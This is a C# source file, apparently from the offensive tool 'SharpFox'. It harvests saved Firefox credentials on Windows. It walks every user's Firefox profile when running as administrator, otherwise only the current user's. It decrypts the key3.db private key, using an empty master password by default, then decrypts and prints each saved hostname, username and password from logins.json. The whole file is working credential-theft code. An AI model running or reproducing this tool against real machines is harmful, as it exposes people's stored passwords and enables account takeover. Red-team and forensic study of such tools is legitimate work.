using System;
using System.Data;
using System.Text;
using SharpFox.Cryptography;
using System.Text.RegularExpressions;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using SharpFox.Models;
using System.Collections.Generic;
using CS_SQLite3;

namespace SharpFox
{
    public class FireFox
    {

        private static void ParseLogins(string directory, string userName, string masterPassword = "")
        {
            // Read berkeleydb
            Asn1Der asn = new Asn1Der();

            BerkeleyDB db = new BerkeleyDB(Path.Combine(directory, "key3.db"));
            PasswordCheck pwdCheck = new PasswordCheck(db.GetValueOfKey("password-check").Replace("-", ""));
            //string GlobalSalt = (from p in db.Keys
            //                     where p.Key.Equals("global-salt")
            //                     select p.Value).FirstOrDefault().Replace("-", "");
            string GlobalSalt = db.GetValueOfKey("global-salt").Replace("-", "");

            MozillaPBE CheckPwd = new MozillaPBE(ByteHelper.ConvertHexStringToByteArray(GlobalSalt), Encoding.ASCII.GetBytes(masterPassword), ByteHelper.ConvertHexStringToByteArray(pwdCheck.EntrySalt));
            CheckPwd.Compute();
            string decryptedPwdChk = TripleDESHelper.DESCBCDecryptor(CheckPwd.Key, CheckPwd.IV, ByteHelper.ConvertHexStringToByteArray(pwdCheck.Passwordcheck));

            if (!decryptedPwdChk.StartsWith("password-check"))
            {
                Console.WriteLine("Master password is wrong; cannot decrypt FireFox logins.");
                return;
            }

            // Get private key
            string f81 = String.Empty;
            String[] blacklist = { "global-salt", "Version", "password-check" };
            foreach (var k in db.Keys)
            {
                if (Array.IndexOf(blacklist, k.Key) == -1)
                {
                    f81 = k.Value.Replace("-", "");
                }
            }
            if (f81 == String.Empty)
            {
                Console.WriteLine("[X] Could not retrieve private key.");
                return;
            }

            Asn1DerObject f800001 = asn.Parse(ByteHelper.ConvertHexStringToByteArray(f81));


            MozillaPBE CheckPrivateKey = new MozillaPBE(ByteHelper.ConvertHexStringToByteArray(GlobalSalt), Encoding.ASCII.GetBytes(masterPassword), f800001.objects[0].objects[0].objects[1].objects[0].Data);
            CheckPrivateKey.Compute();

            byte[] decryptF800001 = TripleDESHelper.DESCBCDecryptorByte(CheckPrivateKey.Key, CheckPrivateKey.IV, f800001.objects[0].objects[1].Data);

            Asn1DerObject f800001deriv1 = asn.Parse(decryptF800001);
            Asn1DerObject f800001deriv2 = asn.Parse(f800001deriv1.objects[0].objects[2].Data);

            byte[] privateKey = new byte[24];

            if (f800001deriv2.objects[0].objects[3].Data.Length > 24)
            {
                Array.Copy(f800001deriv2.objects[0].objects[3].Data, f800001deriv2.objects[0].objects[3].Data.Length - 24, privateKey, 0, 24);
            }
            else
            {
                privateKey = f800001deriv2.objects[0].objects[3].Data;
            }

            // decrypt username and password
            string loginsJsonPath = String.Format("{0}\\{1}", directory, "logins.json");
            Login[] logins = ParseLoginFile(loginsJsonPath);
            if (logins.Length == 0)
            {
                Console.WriteLine("No logins discovered from logins.json");
                return;
            }

            foreach (Login login in logins)
            {
                Asn1DerObject user = asn.Parse(Convert.FromBase64String(login.encryptedUsername));
                Asn1DerObject pwd = asn.Parse(Convert.FromBase64String(login.encryptedPassword));

                string hostname = login.hostname;
                string decryptedUser = TripleDESHelper.DESCBCDecryptor(privateKey, user.objects[0].objects[1].objects[1].Data, user.objects[0].objects[2].Data);
                string decryptedPwd = TripleDESHelper.DESCBCDecryptor(privateKey, pwd.objects[0].objects[1].objects[1].Data, pwd.objects[0].objects[2].Data);

                Console.WriteLine("--- FireFox Credential (User: {0}) ---", userName);
                Console.WriteLine("Hostname: {0}", hostname);
                Console.WriteLine("Username: {0}", Regex.Replace(decryptedUser, @"[^\u0020-\u007F]", ""));
                Console.WriteLine("Password: {0}", Regex.Replace(decryptedPwd, @"[^\u0020-\u007F]", ""));
                Console.WriteLine();
            }
        }

        public static void GetLogins(string MasterPwd = "")
        {
            // Seatbelt path checking
            List<string> validFireFoxDirectories = new List<string>();
            try
            {
                if (IsHighIntegrity())
                {
                    Console.WriteLine("\r\n\r\n=== Checking for Firefox (All Users) ===\r\n");

                    string userFolder = String.Format("{0}\\Users\\", Environment.GetEnvironmentVariable("SystemDrive"));
                    string[] dirs = Directory.GetDirectories(userFolder);
                    foreach (string dir in dirs)
                    {
                        string[] parts = dir.Split('\\');
                        string userName = parts[parts.Length - 1];
                        if (!(dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users")))
                        {
                            string userFirefoxBasePath = String.Format("{0}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", dir);
                            if (System.IO.Directory.Exists(userFirefoxBasePath))
                            {
                                string[] directories = Directory.GetDirectories(userFirefoxBasePath);
                                foreach (string directory in directories)
                                {
                                    string firefoxKeyFile = String.Format("{0}\\{1}", directory, "key3.db");
                                    if (File.Exists(firefoxKeyFile) && File.Exists(String.Format("{0}\\{1}", directory, "logins.json")))
                                    {
                                        ParseLogins(directory, userName, MasterPwd);
                                    }
                                }
                            }
                        }
                    }
                }
                else
                {
                    Console.WriteLine("\r\n\r\n=== Checking for Firefox (Current User) ===\r\n");
                    string userName = Environment.GetEnvironmentVariable("USERNAME");
                    string userFirefoxBasePath = String.Format("{0}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\", System.Environment.GetEnvironmentVariable("USERPROFILE"));

                    if (System.IO.Directory.Exists(userFirefoxBasePath))
                    {
                        string[] directories = Directory.GetDirectories(userFirefoxBasePath);
                        foreach (string directory in directories)
                        {
                            string firefoxKeyFile = String.Format("{0}\\{1}", directory, "key3.db");
                            if (File.Exists(firefoxKeyFile) && File.Exists(String.Format("{0}\\{1}", directory, "logins.json")))
                            {
                                ParseLogins(directory, userName, MasterPwd);
                            }
                        }
                    }
                }
            }
            catch { };
        }

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static Login[] ParseLoginFile(string path)
        {
            string rawText = File.ReadAllText(path);
            int openBracketIndex = rawText.IndexOf('[');
            int closeBracketIndex = rawText.IndexOf(']');
            string loginArrayText = rawText.Substring(openBracketIndex + 1, closeBracketIndex - (openBracketIndex + 1));
            return ParseLoginItems(loginArrayText);
        }

        public static Login[] ParseLoginItems(string loginJSON)
        {
            int openBracketIndex = loginJSON.IndexOf('{');
            List<Login> logins = new List<Login>();
            string[] intParams = new string[] { "id", "encType", "timesUsed" };
            string[] longParams = new string[] { "timeCreated", "timeLastUsed", "timePasswordChanged" };
            while (openBracketIndex != -1)
            {
                int encTypeIndex = loginJSON.IndexOf("encType", openBracketIndex);
                int closeBracketIndex = loginJSON.IndexOf('}', encTypeIndex);
                Login login = new Login();
                string bracketContent = "";
                for (int i = openBracketIndex + 1; i < closeBracketIndex; i++)
                {
                    bracketContent += loginJSON[i];
                }
                bracketContent = bracketContent.Replace("\"", "");
                string[] keyValuePairs = bracketContent.Split(',');
                foreach (string keyValueStr in keyValuePairs)
                {
                    string[] keyValue = keyValueStr.Split(new Char[] { ':' }, 2);
                    string key = keyValue[0];
                    string val = keyValue[1];
                    if (val == "null")
                    {
                        login.GetType().GetProperty(key).SetValue(login, null, null);
                    }
                    if (Array.IndexOf(intParams, key) > -1)
                    {
                        login.GetType().GetProperty(key).SetValue(login, int.Parse(val), null);
                    }
                    else if (Array.IndexOf(longParams, key) > -1)
                    {
                        login.GetType().GetProperty(key).SetValue(login, long.Parse(val), null);
                    }
                    else
                    {
                        login.GetType().GetProperty(key).SetValue(login, val, null);
                    }
                }
                logins.Add(login);
                openBracketIndex = loginJSON.IndexOf('{', closeBracketIndex);
            }
            return logins.ToArray();
        }
    }
}
